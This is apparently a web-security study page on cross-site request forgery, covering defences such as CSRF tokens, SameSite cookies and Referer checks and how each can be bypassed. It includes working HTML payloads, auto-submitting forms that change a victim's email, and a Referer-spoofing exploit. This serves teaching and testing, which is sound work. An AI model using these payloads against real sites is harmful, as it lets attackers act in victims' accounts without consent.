# CSRF (Cross-site request forgery)

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

### Table of content

- [How does it work ?](#how-does-it-work)
- [Get method](#get-method)
- [Post method](#post-method)
- [Common defences against CSRF](#common-defences-against-csrf)
- [bypass CSRF token validation](#bypassing-csrf-token-validation)
    - [Validation of CSRF token depends on request method](#validation-of-csrf-token-depends-on-request-method)
    - [Validation of CSRF token depends on token being present](#validation-of-csrf-token-depends-on-token-being-present)
    - [CSRF token is not tied to the user session](#csrf-token-is-not-tied-to-the-user-session)
    - [CSRF token is tied to a non-session cookie](#csrf-token-is-tied-to-a-non-session-cookie)
    - [CSRF token is simply duplicated in a cookie](#csrf-token-is-simply-duplicated-in-a-cookie)
- [Bypassing SameSite cookie restrictions](#bypassing-samesite-cookie-restrictions)
    - [What is a site](#what-is-a-site)
    - [Site vs origin](#site-vs-origin)
    - [bypass SameSite](#bypass-samesite)
- [Bypassing Referer-based CSRF defenses](#bypassing-referer-based-csrf-defenses)
    - [Validation of Referer depends on header being present](#validation-of-referer-depends-on-header-being-present)
    - [Validation of Referer can be circumvented](#validation-of-referer-can-be-circumvented)

## How does it work ? 

Imagine that you've just opened a fraudulent link. A normal image could be `<img src="https://normal/img/dog">`, and the web browser would resolve the link and display the image.

Now, imagine that the image link is: `<img src="http://www.shopping-online.com/Index?buy=tv&nb=100&confirm=1">`.

In fact, thanks to CSRF, the hacker will attempt to use the connection cookies stored on your computer to make you perform unwanted actions behind your back. Here, they are trying to make you buy 100 TVs on the website http://www.shopping-online.com.

## Get Method

Get Method are easier to resolve and more predectible.

```html
<img src="http://www.shopping-online.com/Index?buy=tv&nb=100&confirm=1">
```

or:

```html
<script>
    location = "http://www.shopping-online.com/Index?buy=tv&nb=100&confirm=1";
</script>
```

## Post Method

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

## Common defences against CSRF

- CSRF tokens - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.
    - [bypass CSRF token validation](#bypassing-csrf-token-validation)
- SameSite cookies - SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from triggering these actions cross-site. Since 2021, Chrome enforces Lax SameSite restrictions by default. As this is the proposed standard, we expect other major browsers to adopt this behavior in future.
    - [Bypassing SameSite cookie restrictions](#bypassing-samesite-cookie-restrictions)
- Referer-based validation - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This is generally less effective than CSRF token validation.
    - [Bypassing Referer-based CSRF defenses](#bypassing-referer-based-csrf-defenses)

## Bypassing CSRF token validation

A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action.

ex:

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

### Validation of CSRF token depends on request method

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

If the form use post method to transmit values, try give them with the GET method.

### Validation of CSRF token depends on token being present

Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

### CSRF token is not tied to the user session

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

You can connect yourself and try your token to feed the victim's token.

### CSRF token is tied to a non-session cookie

In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

```html
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.

### CSRF token is simply duplicated in a cookie

In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

In this situation, the attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.


## Bypassing SameSite cookie restrictions

SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. SameSite cookie restrictions provide partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some CORS exploits.

### What is a site: 

In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD), usually something like .com or .net, plus one additional level of the domain name. This is often referred to as the TLD+1.

![site-def](/web/img/site-definition.png)

### Site vs origin

The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one. Although they're closely related, it's important not to use the terms interchangeably as conflating the two can have serious security implications.

![site-vs-origin](/web/img/site-vs-origin.png)

Example

Request from | Request to | Same-site? | Same-origin?
--- | --- | --- | ---
https://example.com | https://example.com | Yes | Yes
https://app.example.com | https://intranet.example.com | yes | No: mismatched domain name
https://example.com | https://example.com:8080 | Yes | No: mismatched port
https://example.com | https://example.co.uk | No: mismatched eTLD | No: mismatched domain name
https://example.com | http://example.com | 	No: mismatched scheme | No: mismatched scheme

### Bypass SameSite?

SameSite is an attribute of HTTP cookies that controls how cookies are included in requests sent to the server. It is primarily used to enhance security by minimizing the risks of Cross-Site Request Forgery (CSRF) and session theft.

Here's an example of using the SameSite attribute:

```http
Set-Cookie: session=abcdef; SameSite=Strict; Secure
```

In this example, the session cookie will only be sent with requests from the same origin site (same domain). Additionally, it will only be sent over secure connections (HTTPS).

:warning: If the website issuing the cookie doesn't explicitly set a SameSite attribute, Chrome automatically applies Lax restrictions by default.

All major browsers currently support the following SameSite restriction levels:

#### Strict :

Cookies are only sent if the origin (the host of the website) of the request exactly matches the origin of the web page that set the cookie. This means cookies are not shared across websites, even if user actions lead them from one site to another.

[-> Bypassing SameSite Strict restrictions using on-site gadgets](/web/client-side/SameSite/bypass-Samesite-strict.md)

#### Lax :

Cookies are sent with top-level navigation requests (like clicking on a link or manually entering the URL) but not with requests for embedded resources (such as images, scripts, styles, etc.). This ensures that cookies are included in major requests that could result in a state change (e.g., form submission) but not in resource requests.

Lax SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:

- The request uses the GET method.
- The request resulted from a top-level navigation by the user, such as clicking on a link.

[-> Bypass SameSite Lax restrictions](/web/client-side/SameSite/bypass-Samesite-lax.md)

*Likewise, the cookie is not included in background requests, such as those initiated by scripts, iframes, or references to images and other resources.*

#### None :

Cookies are always sent, even for cross-origin requests. This means cookies are shared across websites. However, this mode also requires the cookie to have the Secure attribute (i.e., it must be transmitted via HTTPS rather than HTTP) for security reasons.


## Bypassing Referer-based CSRF defenses

Aside from defenses that employ CSRF tokens, some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain.

**Referer header**

The HTTP Referer header (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request, including by clicking a link or submitting a form. Various methods exist that allow the linking page to withhold or modify the value of the Referer header. This is often done for privacy reasons.

### Validation of Referer depends on header being present

Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.

In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack:

```html
<html>
    <meta name="referrer" content="never">
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### Validation of Referer can be circumvented

Validation of Referer can be circumvented
Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:

`http://vulnerable-website.com.attacker-website.com/csrf-attack`

Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:

`http://attacker-website.com/csrf-attack?vulnerable-website.com`

for example:

```html
<html>
    <body>
        <script>
        history.pushState("", "", "/?vuln-site.net")
        </script>
        <form action="https://vuln-site.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwnd@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

As you can see, my exploit-server now change is url with `history.pushState("", "", "/?vuln-site.net")` to bypass referrer header and provide him the string `vuln-site.net` inside the URL.

:warning: If the explit doesnt work, make sur passing `Referrer-Policy: unsafe-url` this headet to you exploit server to not strp the referrer !

---

[**:arrow_right_hook: Back home**](/README.md)